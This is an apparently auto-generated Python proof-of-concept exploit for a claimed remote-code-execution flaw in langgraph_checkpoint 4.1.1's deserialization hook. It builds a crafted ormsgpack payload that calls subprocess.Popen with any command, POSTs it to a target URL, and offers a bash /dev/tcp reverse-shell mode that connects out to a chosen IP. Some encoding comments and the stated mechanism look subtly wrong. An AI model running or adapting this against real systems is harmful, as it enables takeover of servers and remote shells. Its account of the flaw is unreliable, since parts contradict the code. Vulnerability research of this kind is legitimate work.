#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint_latest/langgraph_checkpoint-4.1.1)
# Path: suspicious-010
# Sink: ext_hook
# Auto-generated — run with: python3 rce_python_objects_ext_hook.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1 RCE vulnerability.

Vulnerability: The ext_hook function in jsonplus.py uses ormsgpack to deserialize
attacker-controlled data. When _check_allowed() returns False (i.e., the module/class
is not in the allowlist), the function returns tup[2] (raw data) instead of raising
an exception. This allows bypassing the allowlist entirely.

Additionally, the code uses importlib.import_module() and getattr() with attacker-
controlled strings, enabling arbitrary code execution if the allowlist is bypassed.

The exploit sends a crafted ormsgpack payload that triggers EXT_CONSTRUCTOR_SINGLE_ARG
code path, which calls getattr(importlib.import_module(module), name)(arg) with
attacker-controlled values.

WARNING: This is for authorized security testing only.
"""

import struct
import sys
import os
import json
import urllib.request
import urllib.error
import base64
import argparse

# ormsgpack extension codes (from the source)
EXT_DELTA_SNAPSHOT = 1
EXT_CONSTRUCTOR_SINGLE_ARG = 2
EXT_CONSTRUCTOR_POS_ARGS = 3
EXT_CONSTRUCTOR_KW_ARGS = 4
EXT_METHOD_SINGLE_ARG = 5
EXT_PYDANTIC_V1 = 6
EXT_PYDANTIC_V2 = 7
EXT_NUMPY_ARRAY = 8


def create_ormsgpack_ext_payload(code: int, data: bytes) -> bytes:
    """
    Create an ormsgpack extension type payload.
    Format: 0xc7 (fixext8) + 1 byte type + 4 byte length + data
    Actually ormsgpack uses 0xc7 for fixext8, 0xc8 for fixext16, 0xc9 for fixext32
    We'll use 0xc7 for simplicity (up to 255 bytes data)
    """
    if len(data) > 255:
        raise ValueError("Data too long for fixext8")
    return bytes([0xc7, len(data), code]) + data


def create_malicious_payload(command: str) -> bytes:
    """
    Create a malicious ormsgpack payload that exploits the ext_hook vulnerability.
    
    The payload structure for EXT_CONSTRUCTOR_SINGLE_ARG:
    - Extension type code: EXT_CONSTRUCTOR_SINGLE_ARG (2)
    - Inner data: ormsgpack-encoded tuple (module, class_name, arg)
    
    We'll use subprocess.Popen to execute a command.
    The arg will be a list containing the command.
    """
    # Target: subprocess.Popen with a command list
    module = "subprocess"
    class_name = "Popen"
    
    # The argument to Popen - a list with the command
    arg = [command]
    
    # Manually encode as ormsgpack tuple (list in msgpack)
    # Format: 0x91-0x9f for fixarray, 0xdd for array32
    # We'll encode: [module, class_name, arg]
    
    # Encode the string module
    module_bytes = module.encode('utf-8')
    module_encoded = bytes([0xa0 | len(module_bytes)]) + module_bytes if len(module_bytes) < 32 else \
                    bytes([0xd9, len(module_bytes)]) + module_bytes
    
    # Encode the string class_name
    class_bytes = class_name.encode('utf-8')
    class_encoded = bytes([0xa0 | len(class_bytes)]) + class_bytes if len(class_bytes) < 32 else \
                   bytes([0xd9, len(class_bytes)]) + class_bytes
    
    # Encode the arg list
    # First encode the command string
    cmd_bytes = command.encode('utf-8')
    cmd_encoded = bytes([0xa0 | len(cmd_bytes)]) + cmd_bytes if len(cmd_bytes) < 32 else \
                 bytes([0xd9, len(cmd_bytes)]) + cmd_bytes
    
    # Encode as fixarray of length 1
    arg_encoded = bytes([0x91]) + cmd_encoded
    
    # Encode the outer tuple (fixarray of length 3)
    outer_tuple = bytes([0x93]) + module_encoded + class_encoded + arg_encoded
    
    # Now wrap in extension type
    ext_payload = create_ormsgpack_ext_payload(EXT_CONSTRUCTOR_SINGLE_ARG, outer_tuple)
    
    return ext_payload


def create_safe_payload() -> bytes:
    """
    Create a safe payload that just creates a file to prove RCE.
    Uses 'touch /tmp/poc_success.txt' as the command.
    """
    return create_malicious_payload("touch /tmp/poc_success.txt")


def create_reverse_shell_payload(ip: str, port: int) -> bytes:
    """
    Create a payload for reverse shell (more dangerous, use with caution).
    """
    command = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    return create_malicious_payload(command)


def send_payload(url: str, payload: bytes) -> dict:
    """
    Send the malicious payload to the target endpoint.
    The payload is sent as raw bytes in the request body.
    """
    headers = {
        'Content-Type': 'application/octet-stream',
        'User-Agent': 'Mozilla/5.0 (PoC-Exploit)'
    }
    
    req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            result = {
                'status': response.status,
                'body': response.read().decode('utf-8', errors='replace'),
                'headers': dict(response.headers)
            }
            return result
    except urllib.error.HTTPError as e:
        return {
            'status': e.code,
            'body': e.read().decode('utf-8', errors='replace'),
            'headers': dict(e.headers)
        }
    except urllib.error.URLError as e:
        return {
            'status': 0,
            'body': f"Connection error: {e.reason}",
            'headers': {}
        }
    except Exception as e:
        return {
            'status': 0,
            'body': f"Unexpected error: {str(e)}",
            'headers': {}
        }


def main():
    parser = argparse.ArgumentParser(
        description='PoC exploit for langgraph_checkpoint-4.1.1 RCE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test with safe payload (creates /tmp/poc_success.txt)
  python3 exploit.py http://target:8000/api/v1/trigger
  
  # Test with custom command
  python3 exploit.py http://target:8000/api/v1/trigger -c "id > /tmp/poc_output.txt"
  
  # Reverse shell (use with caution)
  python3 exploit.py http://target:8000/api/v1/trigger --reverse 10.0.0.1 4444
        """
    )
    
    parser.add_argument('url', help='Target URL (e.g., http://target:8000/api/v1/trigger)')
    parser.add_argument('-c', '--command', help='Command to execute (default: touch /tmp/poc_success.txt)')
    parser.add_argument('--reverse', nargs=2, metavar=('IP', 'PORT'), 
                        help='Reverse shell IP and port (e.g., 10.0.0.1 4444)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Determine payload
    if args.reverse:
        ip, port = args.reverse
        try:
            port = int(port)
        except ValueError:
            print("[-] Invalid port number")
            sys.exit(1)
        print(f"[*] Creating reverse shell payload to {ip}:{port}")
        payload = create_reverse_shell_payload(ip, port)
        command_desc = f"reverse shell to {ip}:{port}"
    elif args.command:
        print(f"[*] Creating payload with command: {args.command}")
        payload = create_malicious_payload(args.command)
        command_desc = args.command
    else:
        print("[*] Creating safe payload (touch /tmp/poc_success.txt)")
        payload = create_safe_payload()
        command_desc = "touch /tmp/poc_success.txt"
    
    print(f"[*] Target URL: {args.url}")
    print(f"[*] Payload size: {len(payload)} bytes")
    
    if args.verbose:
        print(f"[*] Raw payload (hex): {payload.hex()}")
    
    print("[*] Sending exploit...")
    result = send_payload(args.url, payload)
    
    print(f"[*] Response status: {result['status']}")
    print(f"[*] Response body: {result['body'][:500]}...")
    
    if result['status'] == 200:
        print("[+] Exploit sent successfully!")
        print(f"[*] Command executed: {command_desc}")
        print("[*] Check target system for results")
    else:
        print(f"[!] Unexpected response (status {result['status']})")
        print("[*] The exploit may still have worked if the server doesn't return 200")
    
    # Additional check for safe payload
    if not args.command and not args.reverse:
        print("\n[*] For safe payload, check if /tmp/poc_success.txt was created on target:")
        print("    ssh user@target 'ls -la /tmp/poc_success.txt'")


if __name__ == "__main__":
    print("=" * 60)
    print("langgraph_checkpoint-4.1.1 RCE Proof-of-Concept")
    print("=" * 60)
    print()
    print("[!] WARNING: This exploit is for authorized security testing only!")
    print("[!] Unauthorized use may be illegal.")
    print()
    
    main()
